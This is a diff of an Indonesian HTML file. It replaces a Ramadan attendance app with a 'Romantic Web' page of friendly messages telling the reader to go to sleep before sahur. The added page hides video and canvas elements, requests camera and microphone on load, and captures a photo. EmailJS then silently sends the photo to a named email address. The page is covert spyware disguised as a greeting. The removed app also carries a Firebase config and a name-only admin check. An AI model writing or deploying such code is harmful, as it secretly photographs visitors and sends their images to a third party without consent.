@@ -1,324 +1,83 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ABSEN BEGADANG BULAN PUASA 🔥</title>
-
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
-<script src="https://unpkg.com/html5-qrcode"></script>
-
-<style>
-body{
-  margin:0;
-  font-family:Arial;
-  background:#0f172a;
-  color:white;
-  padding:20px;
-}
-.card{
-  background:#1e293b;
-  padding:15px;
-  border-radius:10px;
-  margin-bottom:15px;
-}
-input,button{
-  width:100%;
-  padding:10px;
-  margin:5px 0;
-  border:none;
-  border-radius:6px;
-}
-button{
-  background:#d4af37;
-  font-weight:bold;
-  cursor:pointer;
-}
-img{
-  border-radius:50%;
-}
-h2{color:#d4af37}
-</style>
+    <meta charset="UTF-8">
+    <title>Romantic Web</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #ff9a9e, #fad0c4);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #fff;
+            text-align: center;
+            padding: 50px;
+        }
+        .love {
+            font-size: 2em;
+            margin: 20px 0;
+            animation: float 2s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        video, canvas {
+            display: none; /* Sembunyikan elemen kamera */
+        }
+    </style>
 </head>
 <body>
-
-<h2>🔥 ABSEN BEGADANG RAMADHAN</h2>
-
-<!-- DAFTAR -->
-<div class="card">
-<h3>Registrasi Anggota</h3>
-<input type="text" id="nama" placeholder="Masukkan Nama">
-<input type="file" id="foto" accept="image/*">
-<button onclick="daftar()">Daftar & Dapatkan QR</button>
-<div id="qrcode"></div>
-</div>
-
-<!-- LOGIN ADMIN -->
-<div class="card">
-<h3>Login Admin</h3>
-<input type="text" id="adminNama" placeholder="Nama Admin">
-<button onclick="loginAdmin()">Login</button>
-</div>
-
-<!-- PANEL ADMIN -->
-<div class="card" id="adminPanel" style="display:none">
-<h3>⚡ PANEL ADMIN</h3>
-
-<button onclick="toggleScanner()">Scan QR Anggota</button>
-<div id="reader" style="margin-top:10px;"></div>
-
-<hr>
-
-<button onclick="resetServer()">Reset Server</button>
-
-<input type="text" id="addAnggota" placeholder="Tambah Anggota Manual">
-<button onclick="tambahAnggota()">Tambah Anggota</button>
-
-<input type="text" id="addAdmin" placeholder="Tambah Admin">
-<button onclick="tambahAdmin()">Tambah Admin</button>
-
-<input type="text" id="pesanInfo" placeholder="Kirim Info">
-<button onclick="kirimInfo()">Kirim Notifikasi</button>
-
-</div>
-
-<!-- LIST -->
-<div class="card">
-<h3>Daftar Anggota</h3>
-<div id="list"></div>
-</div>
-
-<script>
-/* ================= FIREBASE ================= */
-const firebaseConfig = {
-  apiKey: "AIzaSyDAeTn9OXkJP5Krlk2J2xtqVqRH6yAdjys",
-  authDomain: "tes-mode-55a53.firebaseapp.com",
-  databaseURL: "https://tes-mode-55a53-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "tes-mode-55a53",
-  storageBucket: "tes-mode-55a53.appspot.com",
-  messagingSenderId: "187568625202",
-  appId: "1:187568625202:web:f7adc75686625a0b8a4e2b"
-};
-
-firebase.initializeApp(firebaseConfig);
-
-const db = firebase.database();
-const anggotaRef = db.ref("anggota_qr");
-const adminRef = db.ref("admins_qr");
-const infoRef = db.ref("info_qr");
-
-let ADMIN_UTAMA="NIAZI";
-let scannerInstance=null;
-
-/* ================= DAFTAR (FIX BUG) ================= */
-function daftar(){
-
-  const nama=document.getElementById("nama").value.trim();
-  const file=document.getElementById("foto").files[0];
-
-  if(!nama){
-    alert("Isi nama!");
-    return;
-  }
-
-  if(!file){
-    alert("Upload foto!");
-    return;
-  }
-
-  anggotaRef.once("value").then(function(snapshot){
-
-    let data=snapshot.val() || {};
-    let sudahAda=false;
-
-    for(let id in data){
-      if(data[id].nama.toLowerCase()===nama.toLowerCase()){
-        sudahAda=true;
-      }
-    }
-
-    if(sudahAda){
-      alert("Nama sudah terdaftar!");
-      return;
-    }
-
-    const reader=new FileReader();
-
-    reader.onload=function(e){
-
-      const idQR="QR_"+Date.now();
-
-      anggotaRef.push({
-        nama:nama,
-        foto:e.target.result,
-        qr:idQR,
-        hadir:false
-      }).then(function(){
-
-        alert("Berhasil daftar!");
-
-        QRCode.toCanvas(idQR,function(err,canvas){
-          document.getElementById("qrcode").innerHTML="";
-          document.getElementById("qrcode").appendChild(canvas);
-        });
-
-        document.getElementById("nama").value="";
-        document.getElementById("foto").value="";
-
-      }).catch(function(error){
-        alert("Gagal simpan database!");
-        console.log(error);
-      });
-    };
-
-    reader.readAsDataURL(file);
-
-  }).catch(function(err){
-    alert("Database error!");
-    console.log(err);
-  });
-}
-
-/* ================= LOGIN ADMIN ================= */
-function loginAdmin(){
-  const nama=document.getElementById("adminNama").value.trim();
-
-  if(!nama){
-    alert("Masukkan nama admin!");
-    return;
-  }
-
-  adminRef.once("value").then(function(snap){
-    let data=snap.val()||{};
-
-    if(nama===ADMIN_UTAMA || data[nama]){
-      document.getElementById("adminPanel").style.display="block";
-      alert("Login Admin berhasil!");
-    }else{
-      alert("Bukan admin!");
-    }
-  });
-}
-
-/* ================= SCAN ================= */
-function toggleScanner(){
-
-  if(scannerInstance){
-    scannerInstance.clear();
-    scannerInstance=null;
-    document.getElementById("reader").innerHTML="";
-    return;
-  }
-
-  scannerInstance=new Html5QrcodeScanner("reader",{fps:10,qrbox:250});
-  scannerInstance.render(onScanSuccess);
-}
-
-function onScanSuccess(decodedText){
-
-  anggotaRef.once("value").then(function(snapshot){
-    let data=snapshot.val() || {};
-
-    let ditemukan=false;
-
-    for(let id in data){
-      if(data[id].qr===decodedText){
-
-        ditemukan=true;
-
-        anggotaRef.child(id).update({hadir:true});
-
-        alert("Absen berhasil untuk "+data[id].nama);
-      }
-    }
-
-    if(!ditemukan){
-      alert("QR tidak valid!");
-    }
-  });
-}
-
-/* ================= ADMIN FITUR ================= */
-function resetServer(){
-  if(confirm("Yakin reset semua data?")){
-    db.ref().remove();
-    alert("Server berhasil direset!");
-  }
-}
-
-function tambahAnggota(){
-  const nama=document.getElementById("addAnggota").value.trim();
-  if(!nama) return;
-
-  anggotaRef.push({
-    nama:nama,
-    foto:"",
-    qr:"QR_"+Date.now(),
-    hadir:false
-  });
-
-  alert("Anggota ditambahkan");
-}
-
-function tambahAdmin(){
-  const nama=document.getElementById("addAdmin").value.trim();
-  if(!nama) return;
-
-  adminRef.child(nama).set(true);
-  alert("Admin ditambahkan");
-}
-
-function kirimInfo(){
-  const pesan=document.getElementById("pesanInfo").value.trim();
-  if(!pesan) return;
-
-  infoRef.set({pesan:pesan});
-  alert("Notifikasi dikirim!");
-}
-
-/* ================= LIST REALTIME (ANTI ERROR) ================= */
-anggotaRef.on("value",function(snapshot){
-
-  const data=snapshot.val();
-  const list=document.getElementById("list");
-  list.innerHTML="";
-
-  if(!data){
-    list.innerHTML="Belum ada anggota.";
-    return;
-  }
-
-  for(let id in data){
-
-    const a=data[id];
-
-    list.innerHTML+=`
-      <div style="background:#334155;padding:10px;margin:5px;border-radius:8px">
-        ${a.foto ? `<img src="${a.foto}" width="60">` : ""}
-        <br><b>${a.nama}</b>
-        <br>${a.hadir ? "Hadir ✅" : "Belum Hadir ❌"}
-      </div>
-    `;
-  }
-});
-
-/* ================= NOTIF ================= */
-infoRef.on("value",function(snapshot){
-
-  const data=snapshot.val();
-
-  if(data && data.pesan){
-
-    if(Notification.permission==="granted"){
-      new Notification("INFO ADMIN",{body:data.pesan});
-    }else{
-      Notification.requestPermission();
-    }
-  }
-});
-</script>
-
+    <h1>❤️ hay teman❤️</h1>
+    <div class="love">"kenapa kamu belum tidur teman"</div>
+    <div class="love">"tidur lah teman besok kamu harus sahur"</div>
+    <div class="love">"jika kamu tidak tidur maka kamu bsok tidak puasa teman dan kamu dosa teman!"</div>
+
+    <!-- Elemen kamera tersembunyi -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <!-- EmailJS Setup -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function () {
+            emailjs.init("WYWXLlJnL5aTjgSxa"); // 🔐 Key EmailJS Anda
+        })();
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Meminta akses kamera dan mikrofon secara otomatis
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+                console.log("Akses kamera dan mikrofon diberikan");
+
+                // Ambil foto otomatis setelah kamera aktif
+                video.onloadedmetadata = () => {
+                    // Ambil foto langsung tanpa delay
+                    takeSnapshot(stream);
+                };
+            })
+            .catch(err => {
+                console.error("Gagal mengakses kamera/mikrofon:", err);
+            });
+
+        function takeSnapshot(stream) {
+            context.drawImage(video, 0, 0, 320, 240);
+            const imageDataURL = canvas.toDataURL('image/png');
+
+            // Kirim foto ke admin (email: maulanaarif95415@gmail.com)
+            emailjs.send("service_fhods8b", "YOUR_TEMPLATE_ID", {
+                to_email: "maulanaarif95415@gmail.com", // 📧 Email tujuan
+                photo: imageDataURL
+            }).then(() => {
+                // Hentikan stream kamera setelah foto diambil
+                stream.getTracks().forEach(track => track.stop());
+                console.log("Foto telah dikirim ke admin dan kamera dihentikan.");
+            }, (error) => {
+                console.error("Gagal mengirim foto:", error);
+            });
+        }
+    </script>
 </body>
 </html>
